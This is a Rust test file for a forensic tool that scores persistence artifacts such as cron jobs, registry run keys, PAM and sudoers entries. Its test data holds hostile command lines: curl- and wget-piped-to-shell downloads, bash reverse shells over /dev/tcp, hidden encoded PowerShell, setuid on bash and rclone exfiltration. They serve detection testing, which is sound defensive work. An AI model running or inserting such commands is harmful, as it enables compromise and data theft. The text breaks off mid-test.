//! Hunting end to end: the analysis tail in the CSV, the CLI switches, the
//! error codes, and the behaviour of the two engines on realistic rows.
mod common;

use common::*;
use faramir::errors::{FaramirError, Severity};
use faramir::event::Event;
use faramir::hunt::normalize::{normalize, DirFamily, NameClass, Os, State};
use faramir::hunt::{evaluate, parse_baseline, rules, Hunt, HuntSettings, KnownGood};
use faramir::windows::diag;

fn ev(host: &str, artifact: &str, cmd: &str, ts: &str) -> Event {
    Event {
        timestamp: ts.into(),
        computer: host.into(),
        artifact: artifact.into(),
        event_id: 0,
        pid: 0,
        subject_username: "User".into(),
        target_username: "User".into(),
        processname: String::new(),
        commandline: Some(cmd.into()),
        parentprocessname: "where".into(),
    }
}

fn run(args: &[&str]) -> (i32, String, String) {
    let o = std::process::Command::new(env!("CARGO_BIN_EXE_faramir")).args(args).output().expect("run faramir");
    (o.status.code().unwrap_or(-1), String::from_utf8_lossy(&o.stdout).to_string(), String::from_utf8_lossy(&o.stderr).to_string())
}

/// A small Linux evidence tree: stock crontab, one cron.d job from /tmp, one every-minute user cron.
fn linux_tree(d: &TempDir) -> std::path::PathBuf {
    d.mkdir("uac-web01-linux-20261028000000/[root]");
    let root = d.join("uac-web01-linux-20261028000000");
    d.write("uac-web01-linux-20261028000000/[root]/etc/passwd", b"root:x:0:0:root:/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n");
    d.write("uac-web01-linux-20261028000000/[root]/etc/hostname", b"web01\n");
    d.write("uac-web01-linux-20261028000000/[root]/var/log/.keep", b"");
    d.write(
        "uac-web01-linux-20261028000000/[root]/etc/crontab",
        b"SHELL=/bin/sh\n17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n",
    );
    d.write("uac-web01-linux-20261028000000/[root]/etc/cron.d/sysstat", b"5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1\n");
    d.write("uac-web01-linux-20261028000000/[root]/etc/cron.d/backdoor", b"* * * * * root /tmp/.x/run.sh\n");
    d.write("uac-web01-linux-20261028000000/[root]/var/spool/cron/crontabs/bob", b"* * * * * curl -s http://10.0.0.5/a.sh | bash\n");
    root
}

fn csv_rows(path: &std::path::Path) -> Vec<csv::StringRecord> {
    let mut rdr = csv::ReaderBuilder::new().has_headers(true).flexible(true).from_path(path).unwrap();
    rdr.records().map(|r| r.unwrap()).collect()
}

fn header(path: &std::path::Path) -> Vec<String> {
    let mut rdr = csv::ReaderBuilder::new().has_headers(true).from_path(path).unwrap();
    rdr.headers().unwrap().iter().map(|s| s.to_string()).collect()
}

// ─── error catalogue ────────────────────────────────────────────────────────

#[test]
fn hunt_error_codes_are_dense_and_in_their_range() {
    let mut nums: Vec<u32> = FaramirError::catalog().iter().map(|e| e.error_number()).filter(|n| (7000..8000).contains(n)).collect();
    nums.sort_unstable();
    assert_eq!(nums.first(), Some(&7001));
    for w in nums.windows(2) {
        assert_eq!(w[1], w[0] + 1, "gap between {} and {}", w[0], w[1]);
    }
    assert_eq!(*nums.last().unwrap(), 7014);
    for e in FaramirError::catalog() {
        if (7000..8000).contains(&e.error_number()) {
            assert_eq!(e.category(), "HUNT");
            assert!(e.code().starts_with("ERR_HUNT_"), "{}", e.code());
        }
    }
}

#[test]
fn hunt_error_severities() {
    assert_eq!(FaramirError::HuntBaselineInvalid(String::new()).severity(), Severity::Error);
    assert_eq!(FaramirError::HuntAlphaInvalid(String::new()).severity(), Severity::Error);
    assert_eq!(FaramirError::HuntKnownGoodOpenFailed(String::new()).severity(), Severity::Error);
    assert_eq!(FaramirError::HuntKnownGoodRowSkipped(String::new()).severity(), Severity::Warning);
    assert_eq!(FaramirError::HuntNoReference(String::new()).severity(), Severity::Warning);
    assert_eq!(FaramirError::HuntTimestampUnparsed(String::new()).severity(), Severity::Warning);
    assert_eq!(FaramirError::HuntKnownGoodLoaded(String::new()).severity(), Severity::Info);
    assert_eq!(FaramirError::HuntSummary(String::new()).severity(), Severity::Info);
    assert_eq!(FaramirError::HuntSingleHost(String::new()).severity(), Severity::Info);
    assert_eq!(FaramirError::HuntDisabled(String::new()).severity(), Severity::Info);
    assert_eq!(FaramirError::HuntAfterBaseline(String::new()).severity(), Severity::Info);
    assert_eq!(FaramirError::HuntMarksOpenFailed(String::new()).severity(), Severity::Error);
    assert_eq!(FaramirError::HuntMarksLoaded(String::new()).severity(), Severity::Info);
    assert_eq!(FaramirError::HuntMarksNotTimeline(String::new()).severity(), Severity::Error);
    let s = FaramirError::HuntBaselineInvalid("x".into()).to_string();
    assert!(s.starts_with("[ERR_HUNT_BASELINE_INVALID - 7001] "), "{s}");
}

// ─── CLI ────────────────────────────────────────────────────────────────────

#[test]
fn cli_rejects_bad_baseline_and_alpha() {
    let d = TempDir::new("hunt_cli_bad");
    let root = linux_tree(&d);
    let out = d.join("out.csv");
    let (code, _, err) = run(&["-d", root.to_str().unwrap(), "-o", out.to_str().unwrap(), "--baseline", "31/10/2026", "--silent"]);
    assert_eq!(code, 1);
    assert!(err.contains("7001"), "{err}");
    let (code, _, err) = run(&["-d", root.to_str().unwrap(), "-o", out.to_str().unwrap(), "--alpha", "1.5", "--silent"]);
    assert_eq!(code, 1);
    assert!(err.contains("7002"), "{err}");
    assert!(!out.exists());
}

#[test]
fn cli_writes_masstins_nineteen_columns_and_flags_the_cron_backdoor() {
    let d = TempDir::new("hunt_cli_ok");
    let root = linux_tree(&d);
    let out = d.join("out.csv");
    let (code, stdout, _) = run(&["-d", root.to_str().unwrap(), "-o", out.to_str().unwrap(), "--baseline", "2020-01-01"]);
    assert_eq!(code, 0);
    assert!(stdout.contains("Hunt:"), "{stdout}");
    let h = header(&out);
    assert_eq!(h.len(), 19);
    assert_eq!(h.join(","), "time_created,dst_computer,event_type,event_id,logon_type,target_user_name,target_domain_name,src_computer,src_ip,subject_user_name,subject_domain_name,logon_id,detail,log_filename,hunt,hunt_score,hunt_why,verdict,notes", "masstin's header, byte for byte");
    assert_eq!(std::fs::read_to_string(&out).unwrap().lines().next().unwrap(), h.join(","), "header written bare");
    let rows = csv_rows(&out);
    assert!(!rows.is_empty());
    let find = |needle: &str| rows.iter().find(|r| r.get(12).unwrap_or("").contains(needle)).unwrap_or_else(|| panic!("row with {needle}"));
    let score_of = |r: &csv::StringRecord| -> u8 { r.get(15).unwrap().parse().unwrap_or_else(|_| panic!("hunt_score: {r:?}")) };
    let backdoor = find("/tmp/.x/run.sh");
    assert_eq!(backdoor.get(14), Some("significant"), "a high rule writes significant: {backdoor:?}");
    assert!(score_of(backdoor) >= 23, "a rule that counts adds its measured points, 23 or more: {backdoor:?}");
    assert!(backdoor.get(16).unwrap().starts_with("rule H3001 (high): "), "the rule's clause first, with id and level: {backdoor:?}");
    let curl = find("curl -s http://10.0.0.5/a.sh");
    assert_eq!(curl.get(14), Some("significant"));
    assert!(score_of(curl) >= 23, "{curl:?}");
    assert!(curl.get(16).unwrap().contains("rule H3004 (high): "), "{curl:?}");
    let stock = find("run-parts --report /etc/cron.hourly");
    assert_eq!(stock.get(14), Some("habitual"), "{stock:?}");
    assert_eq!(stock.get(15), Some("0"), "{stock:?}");
    assert!(stock.get(16).unwrap().contains("stock Linux entry"), "{stock:?}");
    for r in &rows {
        assert_eq!(r.len(), 19, "{r:?}");
        assert_eq!(r.get(1), Some("web01"), "dst_computer: {r:?}");
        assert!(r.get(2).unwrap().starts_with("linux:"), "event_type: {r:?}");
        for k in [4, 6, 7, 8, 10, 11] {
            assert_eq!(r.get(k), Some(""), "logon-only column {k} stays empty: {r:?}");
        }
        assert!(!r.get(12).unwrap().is_empty(), "detail: {r:?}");
        assert!(!r.get(13).unwrap().is_empty(), "log_filename: {r:?}");
        assert!(Hunt::parse(r.get(14).unwrap()).is_some(), "{r:?}");
        assert_ne!(r.get(14), Some(""), "every row gets a state when the hunt is on: {r:?}");
        let score = score_of(r);
        let why = r.get(16).unwrap();
        let rule_levels: Vec<&str> = why.split("; ").filter_map(|c| c.strip_prefix("rule ")).map(|c| c.split(['(', ')']).nth(1).unwrap_or("")).collect();
        match r.get(14).unwrap() {
            "significant" => assert!(score >= 13, "{r:?}"),
            "habitual" | "baseline" => assert_eq!(score, 0, "{r:?}"),
            "candidate" | "not_evaluated" => {}
            other => panic!("{other} is not a word of the shared tail: {r:?}"),
        }
        if rule_levels.contains(&"high") {
            assert_eq!(r.get(14), Some("significant"), "{r:?}");
            assert!(score >= 23, "a high rule that counts: its measured points: {r:?}");
        } else if rule_levels.contains(&"medium") {
            assert!(matches!(r.get(14), Some("candidate" | "significant" | "habitual")), "{r:?}");
            assert!(score >= 10 || r.get(14) == Some("habitual"), "{r:?}");
        }
        // every rule clause is `rule <id> (<level>): <text> [<technique>]`, and the rules come first
        let mut seen_words = false;
        for clause in why.split("; ") {
            if let Some(rest) = clause.strip_prefix("rule ") {
                assert!(!seen_words, "rules before the test's words: {why}");
                let (id, rest) = rest.split_once(' ').unwrap();
                assert!(id.len() == 5 && id.starts_with('H') && id[1..].chars().all(|c| c.is_ascii_digit()), "{why}");
                let (level, text) = rest.split_once("): ").unwrap();
                assert!(matches!(level, "(high" | "(medium" | "(low"), "{why}");
                assert!(text.ends_with(']') && text.contains(" [T"), "{why}");
            } else {
                seen_words = true;
            }
        }
        assert!(!why.starts_with("score "), "the score has its own column: {r:?}");
        assert_eq!(r.get(17), Some(""), "verdict is the analyst's: {r:?}");
        assert_eq!(r.get(18), Some(""), "notes are the analyst's: {r:?}");
    }
}

#[test]
fn cli_carries_the_analysts_marks_onto_the_next_run() {
    let d = TempDir::new("hunt_cli_marks");
    let root = linux_tree(&d);
    let first = d.join("first.csv");
    let (code, _, _) = run(&["-d", root.to_str().unwrap(), "-o", first.to_str().unwrap(), "--silent"]);
    assert_eq!(code, 0);
    // the analyst marks the backdoor by hand, in the CSV
    let text = std::fs::read_to_string(&first).unwrap();
    let mut marked = String::new();
    for line in text.lines() {
        if line.contains("/tmp/.x/run.sh") {
            assert!(line.ends_with(",,"), "{line}");
            marked.push_str(&line[..line.len() - 2]);
            marked.push_str(",\"confirmed\",\"#ir-4711, dropper\"\n");
        } else {
            marked.push_str(line);
            marked.push('\n');
        }
    }
    std::fs::write(&first, marked).unwrap();
    let second = d.join("second.csv");
    let (code, stdout, err) = run(&["-d", root.to_str().unwrap(), "-o", second.to_str().unwrap(), "--carry-marks", first.to_str().unwrap(), "--verbose"]);
    assert_eq!(code, 0, "{err}");
    assert!(err.contains("7013"), "{err}");
    assert!(stdout.contains("Marks carried from 1 file(s): 1 row(s)"), "{stdout}");
    let rows = csv_rows(&second);
    let backdoor = rows.iter().find(|r| r.get(12).unwrap_or("").contains("/tmp/.x/run.sh")).unwrap();
    assert_eq!(backdoor.get(14), Some("significant"));
    assert_eq!(backdoor.get(17), Some("confirmed"), "{backdoor:?}");
    assert_eq!(backdoor.get(18), Some("#ir-4711, dropper"), "{backdoor:?}");
    assert_eq!(rows.iter().filter(|r| !r.get(17).unwrap().is_empty() || !r.get(18).unwrap().is_empty()).count(), 1);
    // a missing file and a foreign CSV are reported, the run goes on
    let foreign = d.join("foreign.csv");
    std::fs::write(&foreign, "time_created,dst_computer\n1,2\n").unwrap();
    let (code, _, err) = run(&["-d", root.to_str().unwrap(), "-o", second.to_str().unwrap(), "--carry-marks", d.join("missing.csv").to_str().unwrap(), "--carry-marks", foreign.to_str().unwrap(), "--verbose"]);
    assert_eq!(code, 0);
    assert!(err.contains("7012"), "{err}");
    assert!(err.contains("7014"), "{err}");
    assert_eq!(header(&second).len(), 19);
}

#[test]
fn cli_no_hunt_leaves_the_columns_empty() {
    let d = TempDir::new("hunt_cli_off");
    let root = linux_tree(&d);
    let out = d.join("out.csv");
    let (code, _, err) = run(&["-d", root.to_str().unwrap(), "-o", out.to_str().unwrap(), "--no-hunt", "--verbose"]);
    assert_eq!(code, 0);
    assert!(err.contains("7010"), "{err}");
    assert_eq!(header(&out).len(), 19);
    for r in csv_rows(&out) {
        assert_eq!(r.len(), 19);
        assert!(r.iter().skip(14).all(|f| f.is_empty()), "{r:?}");
    }
}

#[test]
fn cli_known_good_csv_from_a_clean_host() {
    let d = TempDir::new("hunt_cli_kg");
    let root = linux_tree(&d);
    let clean = d.join("clean.csv");
    let (code, _, _) = run(&["-d", root.to_str().unwrap(), "-o", clean.to_str().unwrap(), "--silent", "--no-hunt"]);
    assert_eq!(code, 0);
    let out = d.join("out.csv");
    let (code, _, err) = run(&["-d", root.to_str().unwrap(), "-o", out.to_str().unwrap(), "--known-good", clean.to_str().unwrap(), "--baseline", "2020-01-01", "--verbose"]);
    assert_eq!(code, 0);
    assert!(err.contains("7005"), "{err}");
    let rows = csv_rows(&out);
    // everything is vouched for, so nothing is merely a candidate; the high rules still fire
    assert!(rows.iter().all(|r| r.get(14) != Some("candidate")), "{rows:?}");
    assert!(rows.iter().any(|r| r.get(14) == Some("habitual") && r.get(15) == Some("0")), "{rows:?}");
    assert!(rows.iter().any(|r| r.get(14) == Some("significant") && r.get(16).unwrap().contains("(high): ")), "a known-good CSV never cancels a high rule: {rows:?}");
    assert!(rows.iter().all(|r| r.get(16).unwrap().contains("in known-good CSV")), "{rows:?}");
    let (code, _, err) = run(&["-d", root.to_str().unwrap(), "-o", out.to_str().unwrap(), "--known-good", d.join("missing.csv").to_str().unwrap(), "--verbose"]);
    assert_eq!(code, 0);
    assert!(err.contains("7003"), "{err}");
}

#[test]
fn cli_help_lists_the_hunt_switches() {
    let (_, out, _) = run(&["--help"]);
    for s in ["--baseline", "--investigation-from", "--alpha", "--known-good", "--no-hunt", "--carry-marks"] {
        assert!(out.contains(s), "{s} missing from --help");
    }
}

// ─── engines on realistic rows ──────────────────────────────────────────────

#[test]
fn every_rule_has_a_row_that_triggers_it() {
    let samples: &[(&str, &str, &str)] = &[
        ("H1001", "windows:persistence:registry_run_key", "mshta http://x/a.hta"),
        ("H1002", "windows:persistence:registry_run_key", "powershell -w hidden -c calc"),
        ("H1003", "windows:persistence:registry_run_key", "mshta vbscript:Execute(\"x\")"),
        ("H1004", "windows:persistence:registry_run_key", "C:\\Users\\Public\\svchost.exe"),
        ("H1005", "windows:persistence:winlogon_shell_property", "explorer.exe, C:\\x.exe"),
        ("H1006", "windows:persistence:image_file_execution_options", "C:\\Windows\\system32\\cmd.exe"),
        ("H1007", "windows:persistence:image_file_execution_options", "\"C:\\Program Files\\X\\dbg.exe\""),
        ("H1008", "windows:persistence:appinit_dlls", "C:\\ProgramData\\h.dll"),
        ("H1009", "windows:persistence:registry_run_key", "wscript C:\\ProgramData\\a.vbs"),
        ("H1010", "windows:persistence:registry_run_key", "C:\\Users\\bob\\Downloads\\a.pdf.exe"),
        ("H1011", "windows:persistence:registry_run_key", "C:\\x\\a.txt:b.exe"),
        ("H1012", "windows:persistence:service_failure_command", "C:\\x.exe"),
        ("H1013", "windows:persistence:registry_run_key", "\\\\srv\\s\\x.exe"),
        ("H1014", "windows:persistence:registry_run_key", "rundll32 C:\\ProgramData\\c.dat,E"),
        ("H1016", "windows:persistence:registry_run_key", "cmd /c start /min C:\\x\\a.exe"),
        ("H1017", "windows:persistence:browser_extension", "chrome id [force-installed by policy] update_url=https://evil/u.xml"),
        ("H1018", "windows:persistence:browser_extension", "chrome id [unpacked (developer mode), path C:\\x]"),
        ("H1019", "windows:persistence:browser_extension", "chrome id [store] permissions=cookies"),
        ("H2001", "linux:rootkit:ld_so_preload", "Preloaded Dynamic Library: /lib/x.so"),
        ("H2002", "linux:pam:exec_backdoor", "PAM [/etc/pam.d/sshd line 1]: auth optional pam_exec.so /tmp/x"),
        ("H2003", "linux:pam:custom_module_path", "PAM [/etc/pam.d/sshd line 1]: auth required /opt/x.so"),
        ("H2004", "linux:ssh:authorized_keys_command", "sshd_config [line 1]: AuthorizedKeysCommand /opt/x"),
        ("H2006", "linux:cron:user_spool", "User Cron * * * * *: /home/u/x.sh"),
        ("H2007", "linux:systemd:service", "Systemd Unit: a.service (Desc: x, Exec: /opt/kworker)"),
        ("H2008", "linux:cron:system_job", "System Cron: chmod +x /opt/x (File: /etc/cron.d/x)"),
        ("H2009", "linux:sudoers:nopasswd", "Sudoers [/etc/sudoers line 1]: bob ALL=(ALL) NOPASSWD: ALL"),
        ("H2010", "linux:sudoers:defaults_override", "Sudoers Defaults [/etc/sudoers line 1]: Defaults !syslog"),
        ("H2011", "linux:modprobe:install_command", "Modprobe Install Hook [/etc/modprobe.d/x.conf line 1]: install usb /opt/x"),
        ("H2012", "linux:modprobe:install_command", "Modprobe Install Hook [/etc/modprobe.d/x.conf line 1]: install dccp /bin/true"),
        ("H2013", "linux:apt:package_hook", "APT Hook [/etc/apt/apt.conf.d/9 line 1]: APT::Update::Pre-Invoke {\"/opt/x\";};"),
        ("H2014", "linux:process:temp_path_execution", "Executing Binary Link: /tmp/x"),
        ("H2015", "linux:shell:bashrc", "/home/u/.bashrc [line 1]: export LD_PRELOAD=/opt/x.so"),
        ("H2016", "linux:shell:bashrc", "/home/u/.bashrc [line 1]: export HISTSIZE=0"),
        ("H2017", "linux:browser:extension_forced", "chrome id [forced by policy] update_url=https://evil/u.xml [profile policy] /etc/x"),
        ("H2018", "linux:browser:extension", "chrome id [sideloaded (app-system-share)] [profile p] /home/u/x"),
        ("H2019", "linux:browser:extension", "chrome id [store] permissions=nativeMessaging [profile p] /home/u/x"),
        ("H2020", "linux:xdg:autostart", "XDG Autostart: a.desktop (A) -> /opt/a"),
        ("H2021", "linux:udev:run_action", "Udev [/etc/udev/rules.d/x line 1]: RUN+=\"/bin/sh -c '/opt/x'\""),
        ("H3001", "linux:cron:system_job", "System Cron: /tmp/x (File: /etc/cron.d/x)"),
        ("H3002", "windows:persistence:registry_run_key", "C:\\Users\\bob\\AppData\\Roaming\\x\\x.exe"),
        ("H3003", "windows:persistence:registry_run_key", "C:\\Users\\bob\\Desktop\\x.exe"),
        ("H3004", "linux:cron:system_job", "System Cron: wget -qO- http://x/a | sh (File: /etc/cron.d/x)"),
        ("H3005", "linux:cron:system_job", "System Cron: bash -i >& /dev/tcp/1.2.3.4/4444 0>&1 (File: /etc/cron.d/x)"),
        ("H3006", "windows:persistence:registry_run_key", "powershell -enc AAAA"),
        ("H3007", "windows:persistence:windows_service", "C:\\x\\ngrok.exe tcp 3389"),
        ("H3008", "windows:persistence:windows_service", "\"C:\\Program Files\\RustDesk\\rustdesk.exe\" --service"),
        ("H3009", "linux:cron:user_spool", "User Cron 0 * * * *: rclone copy /srv remote:x"),
        ("H3010", "linux:boot:rc_local", "rc.local [line 1]: iptables -F"),
        ("H3011", "windows:persistence:registry_run_key", "cmd /c schtasks /create /tn x /tr C:\\x.exe /sc minute"),
        ("H3012", "linux:cron:system_job", "System Cron: chmod u+s /bin/bash (File: /etc/cron.d/x)"),
        ("H3013", "windows:persistence:registry_run_key", "C:\\Users\\bob\\AppData\\Roaming\\a1b2c3d4e5f6.exe"),
        ("H3014", "windows:persistence:removed_since_vss:registry_run_key", "C:\\Windows\\system32\\x.exe"),
        ("H3015", "windows:persistence:registry_run_key", "C:\\x.exe"),
    ];
    let mut covered = std::collections::HashSet::new();
    for (id, artifact, cmd) in samples {
        let row = normalize(0, &ev("H", artifact, cmd, "2026-10-28 12:00:00.000"));
        let hit: Vec<&str> = rules::matching(&row).iter().map(|r| r.id).collect();
        assert!(hit.contains(id), "{id} should fire for {cmd:?}; fired {hit:?}");
        covered.insert(*id);
    }
    // every rule except the SYSTEM-task one (needs the user column) and the duplicate-level browser ones has a sample
    let missing: Vec<&str> = rules::RULES.iter().map(|r| r.id).filter(|id| !covered.contains(id) && !matches!(*id, "H1015" | "H2005" | "H2022")).collect();
    assert!(missing.is_empty(), "rules without a sample: {missing:?}");
}

#[test]
fn stock_rows_are_habitual_never_candidate_by_date_or_by_a_medium_rule() {
    diag::clear();
    let b = parse_baseline("2026-01-01").unwrap();
    let events = vec![
        ev("H", "windows:persistence:registry_run_key", "C:\\Windows\\system32\\SecurityHealthSystray.exe", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:registry_run_key", "\"C:\\Users\\bob\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:windows_service", "C:\\Windows\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:windows_service", "\\SystemRoot\\System32\\drivers\\afd.sys", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:winlogon_userinit_property", "C:\\Windows\\system32\\userinit.exe,", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:boot_execute", "autocheck autochk *", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:safeboot_alternateshell", "cmd.exe", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:lsa_packages", "kerberos", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:security_support_provider", "credssp", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:print_monitor_dll", "tcpmon.dll", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:network_provider_dll", "%SystemRoot%\\System32\\ntlanman.dll", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:time_provider_dll", "%systemroot%\\system32\\w32time.dll", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:netsh_helper_dll", "ifmon.dll", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:shellserviceobjectdelayload", "WebCheck", "2026-10-28 12:00:00.000"),
        ev("L", "linux:cron:system_job", "System Cron: cd / && run-parts --report /etc/cron.daily (File: /etc/crontab)", "2026-10-28 12:00:00.000"),
        ev("L", "linux:cron:periodic:daily", "Periodic Cron Script: /etc/cron.daily/logrotate", "2026-10-28 12:00:00.000"),
        ev("L", "linux:sudoers:defaults_override", "Sudoers Defaults [/etc/sudoers line 1]: Defaults secure_path=\"/usr/local/sbin:/usr/bin\"", "2026-10-28 12:00:00.000"),
        ev("L", "linux:apt:package_hook", "APT Hook [/etc/apt/apt.conf.d/20listchanges line 1]: DPkg::Post-Invoke { \"/usr/bin/apt-listchanges --apt\"; };", "2026-10-28 12:00:00.000"),
    ];
    let (v, r) = evaluate(&events, &HuntSettings { baseline: Some(b), ..Default::default() });
    for (e, vd) in events.iter().zip(&v) {
        assert_eq!(vd.hunt, Hunt::Habitual, "{} {:?} -> {:?}", e.artifact, e.commandline, vd);
        assert_eq!(vd.score, 0);
        assert!(vd.reasons.iter().any(|x| x.starts_with("stock")), "{:?}", vd);
    }
    assert_eq!(r.stock, events.len());
    assert_eq!(r.habitual, events.len());
    assert_eq!(r.candidate, 0);
}

#[test]
fn classic_attacks_are_significant_by_a_high_rule() {
    diag::clear();
    let events = vec![
        ev("H", "windows:persistence:registry_run_key", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:image_file_execution_options", "C:\\Windows\\System32\\cmd.exe", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:scheduled_task", "C:\\Users\\Public\\Libraries\\svchost.exe", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:windows_service", "cmd.exe /c C:\\Windows\\Temp\\s.bat", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:winlogon_shell_property", "explorer.exe,C:\\Users\\bob\\AppData\\Roaming\\Microsoft\\x.exe", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:com_object_hijacking", "C:\\Users\\bob\\AppData\\Local\\Temp\\api-ms-win.dll", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:startup_folder", "C:\\Users\\bob\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\invoice.pdf.lnk -> C:\\Users\\bob\\AppData\\Roaming\\x.exe", "2026-10-28 12:00:00.000"),
        ev("L", "linux:cron:user_spool", "User Cron: @reboot /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'", "2026-10-28 12:00:00.000"),
        ev("L", "linux:systemd:service", "Systemd Unit: systemd-networkd-wait.service (Desc: x, Exec: /dev/shm/.systemd/kworker)", "2026-10-28 12:00:00.000"),
        ev("L", "linux:ssh:authorized_key", "ssh-rsa AAAA... command=\"/tmp/x\" bob@evil (File: /root/.ssh/authorized_keys)", "2026-10-28 12:00:00.000"),
        ev("L", "linux:rootkit:ld_so_preload", "Preloaded Dynamic Library: /usr/lib/libselinux.so.2", "2026-10-28 12:00:00.000"),
        ev("L", "linux:shell:bashrc", "/root/.bashrc [line 40]: alias sudo='/usr/local/lib/.s/sudo'", "2026-10-28 12:00:00.000"),
    ];
    let (v, r) = evaluate(&events, &HuntSettings::default());
    for (e, vd) in events.iter().zip(&v) {
        assert_eq!(vd.hunt, Hunt::Significant, "{} {:?} -> {:?}", e.artifact, e.commandline, vd);
        assert!(vd.score >= 23, "{:?}", vd);
        assert!(vd.reasons[0].starts_with("rule H") && vd.reasons[0].contains(" (high): "), "{:?}", vd.reasons);
    }
    assert_eq!(r.rule_high, events.len());
    assert_eq!(r.significant, events.len());
}

#[test]
fn ordinary_third_party_software_is_baseline_habitual_or_candidate() {
    diag::clear();
    let b = parse_baseline("2026-01-01").unwrap();
    let events = vec![
        ev("H", "windows:persistence:registry_run_key", "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -silent", "2025-10-28 12:00:00.000"),
        ev("H", "windows:persistence:windows_service", "\"C:\\Program Files\\Common Files\\Adobe\\ARM\\1.0\\armsvc.exe\"", "2025-10-28 12:00:00.000"),
        ev("H", "windows:persistence:scheduled_task", "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua /installsource scheduler", "2026-10-28 12:00:00.000"),
        ev("L", "linux:systemd:service", "Systemd Unit: nginx.service (Desc: nginx, Exec: /usr/sbin/nginx -g 'daemon on; master_process on;')", "2026-10-28 12:00:00.000"),
        ev("L", "linux:cron:user_spool", "User Cron 0 3 * * *: /usr/bin/certbot renew --quiet", "2025-10-28 12:00:00.000"),
    ];
    let (v, _) = evaluate(&events, &HuntSettings { baseline: Some(b), ..Default::default() });
    assert_eq!(v[0].hunt, Hunt::Baseline, "{:?}", v[0]);
    assert_eq!(v[1].hunt, Hunt::Baseline, "{:?}", v[1]);
    assert_eq!(v[2].hunt, Hunt::Candidate, "{:?}", v[2]);
    assert!(v[2].score < 13, "candidate: {:?}", v[2]);
    assert!(v[0].score == 0 && v[1].score == 0 && v[3].score == 0 && v[4].score == 0, "{v:?}");
    assert_eq!(v[3].hunt, Hunt::Habitual, "{:?}", v[3]);
    assert_eq!(v[4].hunt, Hunt::Habitual, "certbot's cron is a stock entry: {:?}", v[4]);
    assert!(v.iter().all(|x| x.hunt < Hunt::Significant));
}

#[test]
fn removed_persistence_is_at_least_a_candidate() {
    diag::clear();
    let events = vec![
        ev("H", "windows:persistence:deleted:registry_run_key", "C:\\Program Files\\Vendor\\v.exe", ""),
        ev("H", "windows:persistence:removed_since_vss:windows_service", "C:\\Program Files\\Vendor\\svc.exe", "2026-10-28 12:00:00.000"),
        ev("H", "windows:persistence:carved:registry_run_key", "C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe", "2026-10-28 12:00:00.000"),
        ev("L", "linux:deleted:cron:system_job", "System Cron: /usr/bin/x (File: /etc/cron.d/x)", "2026-10-28 12:00:00.000"),
        ev("L", "linux:previous_version:sudoers:nopasswd", "Sudoers [/etc/sudoers line 1]: bob ALL=(ALL) NOPASSWD: ALL", "2026-10-28 12:00:00.000"),
    ];
    let (v, _) = evaluate(&events, &HuntSettings::default());
    assert_eq!(v[0].hunt, Hunt::Candidate);
    assert!(v[0].reasons.iter().any(|x| x == "deleted"));
    assert_eq!(v[1].hunt, Hunt::Candidate);
    assert!(v[1].reasons.iter().any(|x| x == "removed since VSS"));
    assert_eq!(v[2].hunt, Hunt::Significant, "carved from Temp: a high rule: {:?}", v[2]);
    assert!(v[2].reasons.iter().any(|x| x == "carved"));
    assert_eq!(v[3].hunt, Hunt::Candidate);
    assert_eq!(v[4].hunt, Hunt::Candidate, "a medium rule (NOPASSWD) on a previous version: {:?}", v[4]);
    assert!(v[4].score >= 10, "{:?}", v[4]);
    assert!(v[4].reasons[0].starts_with("rule H2009 (medium): "), "{:?}", v[4].reasons);
    assert!(v[4].reasons.iter().any(|x| x == "previous version"));
}

#[test]
fn normalisation_of_real_world_values() {
    let r = normalize(0, &ev("H", "windows:persistence:windows_service", "\\SystemRoot\\System32\\drivers\\afd.sys", ""));
    assert_eq!(r.family, DirFamily::System32);
    assert_eq!(r.image_ext, ".sys");
    let r = normalize(0, &ev("H", "windows:persistence:scheduled_task", "%windir%\\system32\\sc.exe start w32time task_started", ""));
    assert_eq!(r.image_name, "sc.exe");
    assert_eq!(r.family, DirFamily::System32);
    let r = normalize(0, &ev("H", "windows:persistence:registry_run_key", "\"C:\\Users\\bob\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\" --startup", ""));
    assert_eq!(r.family, DirFamily::UserLocalAppData);
    assert_eq!(r.name_class, NameClass::Alpha);
    let r = normalize(0, &ev("H", "windows:persistence:active_setup_stubpath", "regsvr32.exe /s /n /i:U shell32.dll", ""));
    assert_eq!(r.launcher, "regsvr32.exe");
    assert_eq!(r.image_name, "shell32.dll");
    let r = normalize(0, &ev("L", "linux:systemd:timer", "Systemd Timer: apt-daily.timer -> apt-daily.service (OnCalendar=*-*-* 6,18:00)", ""));
    assert_eq!(r.image, "apt-daily.service");
